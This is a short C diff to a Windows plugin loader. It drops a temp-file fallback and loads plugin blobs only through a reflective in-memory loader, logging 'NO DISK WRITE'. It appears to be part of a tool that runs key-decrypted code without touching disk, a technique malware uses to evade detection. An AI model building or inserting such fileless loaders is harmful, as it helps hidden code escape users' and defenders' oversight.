@@ -251,35 +251,21 @@ int plugin_loader_init(const char *key_hex) {
     return 0;
 }
 
-// Helper to attempt loading a plugin blob (in-memory loader if available, else temp file)
+// External reflective loader from stub.c (compiled together)
+extern HMODULE LoadDllInMemory(void *dll_data, DWORD dll_size);
+
+// Helper to load plugin blob directly in memory (no temp files)
 static HMODULE load_blob_as_module(unsigned char *blob, uint32_t len, const char *id) {
-    HMODULE h = NULL;
-    typedef HMODULE (*LoadDllInMemory_t)(void *, DWORD);
-    HMODULE mod = GetModuleHandle(NULL);
-    FARPROC pfn = GetProcAddress(mod, "LoadDllInMemory");
-    if (pfn) {
-        LoadDllInMemory_t loader = (LoadDllInMemory_t)pfn;
-        write_plugin_log("Attempting in-memory load of plugin '%s' size=%u", id, len);
-        h = loader(blob, (DWORD)len);
-        write_plugin_log("In-memory load result for '%s' = %p", id, (void*)h);
-        return h;
+    write_plugin_log("Loading plugin '%s' in-memory (size=%u bytes)", id, len);
+    
+    HMODULE h = LoadDllInMemory(blob, (DWORD)len);
+    
+    if (h) {
+        write_plugin_log("✓ Plugin '%s' loaded at %p (NO DISK WRITE)", id, (void*)h);
+    } else {
+        write_plugin_log("✗ Plugin '%s' failed to load (error=%u)", id, GetLastError());
     }
-    // fallback: write to temp file and LoadLibrary
-    char tmpPath[MAX_PATH];
-    char tmpName[MAX_PATH];
-    if (GetTempPathA(MAX_PATH, tmpPath) && GetTempFileNameA(tmpPath, "plg", 0, tmpName)) {
-        HANDLE hf = CreateFileA(tmpName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hf != INVALID_HANDLE_VALUE) {
-            DWORD written;
-            WriteFile(hf, blob, (DWORD)len, &written, NULL);
-            CloseHandle(hf);
-            write_plugin_log("Wrote temp plugin '%s' (size=%u)", tmpName, len);
-            h = LoadLibraryA(tmpName);
-            if (h) write_plugin_log("LoadLibrary succeeded for temp '%s' -> %p", tmpName, (void*)h);
-            else write_plugin_log("LoadLibrary failed for temp '%s' -> error=%u", tmpName, GetLastError());
-            DeleteFileA(tmpName);
-        }
-    }
+    
     return h;
 }
 
